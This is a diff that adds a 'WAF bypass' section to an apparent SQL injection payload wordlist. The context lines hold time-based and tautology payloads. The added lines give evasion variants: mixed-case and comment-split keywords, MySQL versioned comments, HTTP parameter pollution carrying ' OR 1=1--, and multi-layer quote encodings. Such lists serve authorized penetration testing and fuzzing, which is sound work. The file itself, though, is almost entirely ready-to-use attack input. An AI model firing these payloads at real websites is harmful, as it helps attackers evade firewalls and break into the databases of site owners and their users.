@@ -1142,3 +1142,27 @@ waitfor delay '00:00:05'--
 {"where":{"role":{"_eq":"admin"}}}
 ||pg_sleep(5)--
 ’ or ‘1’=’1
+# ─── WAF bypass: SQL comment-hiding + case mixing (SqLmAp-style variants) ───
+# Case variations — many WAF rules match /select/i but miss mixed-case in whitespaced/parameterized queries
+SeLeCt
+sElEcT
+UnIoN
+uNiOn SeLeCt
+UNION/**/SELECT
+UNI%00ON
+# In-word comment injection — MySQL/MariaDB parse /* */ inside keywords
+SE/**/LECT
+SE//LECT
+UN/**/ION
+UN//ION
+/*!SELECT*/
+/*!50000SELECT*/
+# HTTP parameter pollution — WAF picks last, backend picks first (or vice versa)
+?id=1&id=2
+?id=1&id=' OR 1=1--
+id=safe&id[]=malicious
+# Multi-encoding chains
+%2527 → %27 → '   (double-URL)
+%25%32%37 → %27 → '   (triple-URL)
+%u0027   (IIS unicode)
+&#x27;   (HTML numeric)
